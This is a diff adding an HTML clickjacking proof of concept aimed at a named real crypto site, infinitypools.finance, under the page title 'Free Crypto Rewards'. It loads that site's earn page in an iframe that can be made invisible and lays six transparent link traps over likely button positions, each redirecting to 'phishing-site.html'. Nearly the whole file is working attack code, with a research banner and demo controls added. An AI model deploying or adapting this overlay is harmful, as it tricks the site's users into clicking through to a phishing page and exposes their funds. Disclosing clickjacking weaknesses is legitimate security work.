@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Crypto Rewards</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+
+        .demo-banner {
+            background: #ff6b6b;
+            color: white;
+            padding: 15px;
+            text-align: center;
+            font-weight: bold;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 99999;
+        }
+
+        .demo-controls {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: white;
+            padding: 15px;
+            border-radius: 10px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+            z-index: 99999;
+        }
+
+        .demo-controls button {
+            display: block;
+            width: 100%;
+            margin: 5px 0;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .show-overlay {
+            background: #28a745;
+            color: white;
+        }
+
+        .hide-overlay {
+            background: #dc3545;
+            color: white;
+        }
+
+        .show-traps {
+            background: #ffc107;
+            color: #333;
+        }
+
+        .container {
+            padding-top: 60px;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .decoy-content {
+            background: white;
+            margin: 20px;
+            padding: 40px;
+            border-radius: 15px;
+            text-align: center;
+        }
+
+        .decoy-content h1 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 36px;
+        }
+
+        .decoy-content p {
+            color: #666;
+            font-size: 18px;
+            margin-bottom: 30px;
+        }
+
+        .iframe-container {
+            position: relative;
+            width: 100%;
+            height: 800px;
+            margin: 20px auto;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+
+        #legitimateIframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            opacity: 0.5;
+        }
+
+        .malicious-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 100;
+        }
+
+        .click-trap {
+            position: absolute;
+            pointer-events: auto;
+            cursor: pointer;
+            background: transparent;
+            border: none;
+        }
+
+        .click-trap.visible {
+            background: rgba(255, 0, 0, 0.3);
+            border: 3px solid red;
+        }
+
+        .click-trap:hover.visible {
+            background: rgba(255, 0, 0, 0.5);
+        }
+
+        /* Position traps over common button locations */
+        .trap-center {
+            top: 45%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 300px;
+            height: 60px;
+        }
+
+        .trap-top {
+            top: 20%;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 250px;
+            height: 50px;
+        }
+
+        .trap-bottom {
+            bottom: 20%;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 250px;
+            height: 50px;
+        }
+
+        .trap-left {
+            top: 50%;
+            left: 15%;
+            transform: translateY(-50%);
+            width: 200px;
+            height: 50px;
+        }
+
+        .trap-right {
+            top: 50%;
+            right: 15%;
+            transform: translateY(-50%);
+            width: 200px;
+            height: 50px;
+        }
+
+        /* Large area trap to catch most clicks */
+        .trap-wide {
+            top: 35%;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80%;
+            height: 40%;
+        }
+    </style>
+</head>
+<body>
+    <div class="demo-banner">
+        🔴 SECURITY RESEARCH PoC - This demonstrates clickjacking vulnerability on infinitypools.finance
+    </div>
+
+    <div class="demo-controls">
+        <h4 style="margin-bottom: 10px;">Demo Controls:</h4>
+        <button class="show-overlay" onclick="showIframe()">Show Legitimate Site</button>
+        <button class="hide-overlay" onclick="hideIframe()">Hide Site (Real Attack)</button>
+        <button class="show-traps" onclick="toggleTraps()">Toggle Red Zones</button>
+        <p style="margin-top: 10px; font-size: 12px; color: #666;">
+            Click zones = Malicious links<br>
+            They redirect to attacker site
+        </p>
+    </div>
+
+    <div class="container">
+        <div class="iframe-container">
+            <!-- The legitimate Infinity Pools site -->
+            <iframe 
+                id="legitimateIframe"
+                src="https://infinitypools.finance/earn"
+                sandbox="allow-scripts allow-same-origin"
+            ></iframe>
+
+            <!-- Invisible malicious overlay with click traps -->
+            <div class="malicious-overlay" id="maliciousOverlay">
+                <!-- Multiple click traps positioned to catch button clicks -->
+                <a href="phishing-site.html" class="click-trap trap-center" id="trap1" target="_blank"></a>
+                <a href="phishing-site.html" class="click-trap trap-top" id="trap2" target="_blank"></a>
+                <a href="phishing-site.html" class="click-trap trap-bottom" id="trap3" target="_blank"></a>
+                <a href="phishing-site.html" class="click-trap trap-left" id="trap4" target="_blank"></a>
+                <a href="phishing-site.html" class="click-trap trap-right" id="trap5" target="_blank"></a>
+                <a href="phishing-site.html" class="click-trap trap-wide" id="trap6" target="_blank"></a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const iframe = document.getElementById('legitimateIframe');
+        const traps = document.querySelectorAll('.click-trap');
+        let trapsVisible = false;
+
+        function showIframe() {
+            iframe.style.opacity = '0.5';
+        }
+
+        function hideIframe() {
+            iframe.style.opacity = '0';
+            alert('⚠️ REAL ATTACK MODE: The iframe is now invisible. Users see only the decoy content but clicking anywhere redirects to the attacker\'s phishing site!');
+        }
+
+        function toggleTraps() {
+            trapsVisible = !trapsVisible;
+            traps.forEach(trap => {
+                if (trapsVisible) {
+                    trap.classList.add('visible');
+                } else {
+                    trap.classList.remove('visible');
+                }
+            });
+        }
+
+        // Log clicks for demonstration
+        traps.forEach((trap, index) => {
+            trap.addEventListener('click', function(e) {
+                console.log(`🚨 ATTACK: Click trap ${index + 1} triggered - Redirecting to phishing site`);
+            });
+        });
+
+        iframe.addEventListener('load', () => {
+            console.log('✅ Legitimate site loaded in iframe');
+            console.log('🎯 Malicious click traps are active');
+        });
+
+        iframe.addEventListener('error', () => {
+            console.error('❌ Failed to load - Site may have X-Frame-Options protection');
+            alert('The target site could not be loaded. This might mean they already have clickjacking protection enabled (X-Frame-Options or CSP frame-ancestors).');
+        });
+    </script>
+</body>
+</html>
